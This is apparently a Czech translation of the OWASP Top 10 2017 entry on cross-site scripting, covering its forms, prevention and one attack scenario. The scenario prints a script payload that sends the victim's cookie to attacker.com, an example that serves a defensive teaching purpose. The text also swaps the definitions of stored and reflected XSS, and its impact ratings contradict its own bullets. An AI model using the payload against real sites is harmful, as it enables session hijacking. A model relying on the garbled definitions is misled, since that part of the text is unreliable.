# A7:2017 Cross-Site Scripting (XSS)

| Původci hrozby/Vektor útoku | Bezpečnostní slabina           | Dopady               |
| -- | -- | -- |
| Aplikačně specifické : Zneužitelnost 3 | Rozšíření 3 : Zjistitelnost 3 | Technické 2 : Obchodní |
| Automatizované nástroje mohou detekovat a využívat všechny tři formy XSS a existují i volně dostupné frameworky. | XSS je druhým nejrozšířenějším problémem v OWASP Top 10 a nachází se v přibližně dvou třetinách všech aplikací. Automatizované nástroje mohou některé problémy XSS automaticky najít, zejména ve vyspělých technologiích, jako jsou PHP, J2EE/JSP a ASP.NET. | Dopad stored XSS a DOM XSS útoku je mírný. Pro reflected XSS je dopad vážný kvůli vzdálenému spuštění kódu v prohlížeči oběti, kdy může nastat krádež pověření, relace nebo doručení malwaru oběti. |

## Je aplikace zranitelná?

Existují tři formy XSS, obvykle zaměřené na prohlížeče uživatelů:

* **Stored XSS**: Aplikace nebo rozhraní API obsahuje jako součást výstupu HTML neověřený a neescapovaný vstup uživatele. Úspěšný útok může útočníkovi umožnit spustit libovolný HTML a JavaScript v prohlížeči oběti. Uživatel bude obvykle muset komunikovat s nějakým nebezpečným odkazem, který ukazuje na stránku ovládanou útočníkem, jako jsou škodlivé watering hole stránky, reklamy apod.
* **Reflected XSS**: Aplikace nebo API ukládá nesanitovaný vstup uživatele, který si později prohlédne jiný uživatel nebo administrátor. Trvalé XSS je často považováno za vysoké nebo kritické riziko.
* **DOM XSS**: JavaScript frameworky, single-page aplikace, a API rozhraní, které dynamicky zahrnují na stránku data kontrolovatelná útočníkem, jsou zranitelné vůči DOM XSS. V ideálním případě by aplikace neměla posílat data řízená útočníkem na nespolehlivá rozhraní API JavaScriptu.

Typické útoky XSS zahrnují krádeže relací, převzetí účtu, MFA bypass, nahrazení nebo znehodnocení DOM (například přihlašovací panely trojských koní), útoky proti prohlížeči uživatele, například stahování škodlivého softwaru, protokolování klíčů a další útoky na straně klienta.

## Jak se mohu bránit?

Prevence XSS vyžaduje oddělení nedůvěryhodných dat od aktivního obsahu prohlížeče. Toho lze dosáhnout:

* Používáním frameworků, které automaticky escapují XSS, například nejnovější Ruby on Rails, React JS. Nastudujte si jednotlivá omezení XSS ochrany u každého frameworku a případy, které nejsou ošetřeny, adekvátně vyřešte.
* Důkladné escapování všech nedůvěryhodných dat založených na kontextu HTML (body, attribute, JavaScript, CSS, nebo URL) vyřeší reflected a stored XSS chyby. [OWASP  Cheat Sheet 'XSS Prevention'](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)  poskytuje podrobnosti o požadovaných technikách úniku dat.
* Použití kontextového kódování při úpravách dokumentu prohlížeče na straně klienta se jeví jako obrana proti DOM XSS. Pokud tomu nelze zabránit, podobné kontextové techniky escapování lze použít na API prohlížeče, jak je popsáno v OWASP Cheat Sheet 'DOM based XSS Prevention'.
* Povolení [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) jako hloubkové obrany zmírňující kontrolu proti XSS. Je účinná, pokud neexistují žádné další chyby zabezpečení, které by umožňovaly umisťování škodlivého kódu prostřednictvím lokálních souborů (např. přepisy procházení cest nebo zranitelné knihovny z povolených sítí pro doručování obsahu).

## Příklady útočných scénářů

**Scénář #1**: Při konstrukci následujícího kousku HTML používá aplikace nedůvěryhodná data bez validace či escapování:

`(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";`
Útočník změní parametr ‘CC’ ve svém prohlížeči na:

`'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'`

Tento útok způsobí odeslání ID relace oběti na webové stránky útočníka, což mu umožní unést aktuální relaci oběti.

**Poznámka**: Útočníci mohou pomocí XSS zdolat jakoukoli automatizovanou obranu Cross-Site Request Forgery (CSRF), kterou aplikace může používat.


## Odkazy

### OWASP

* [OWASP Proactive Controls: Encode Data](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
* [OWASP Proactive Controls: Validate Data](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
* [OWASP Application Security Verification Standard: V5](https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project)
* [OWASP Testing Guide: Testing for Reflected XSS](https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001))
* [OWASP Testing Guide: Testing for Stored XSS](https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002))
* [OWASP Testing Guide: Testing for DOM XSS](https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001))
* [OWASP Cheat Sheet: XSS Prevention](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
* [OWASP Cheat Sheet: DOM based XSS Prevention](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet)
* [OWASP Cheat Sheet: XSS Filter Evasion](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
* [OWASP Java Encoder Project](https://www.owasp.org/index.php/OWASP_Java_Encoder_Project)

### Externí

* [CWE-79: Improper neutralization of user supplied input](https://cwe.mitre.org/data/definitions/79.html)
* [PortSwigger: Client-side template injection](https://portswigger.net/kb/issues/00200308_clientsidetemplateinjection)
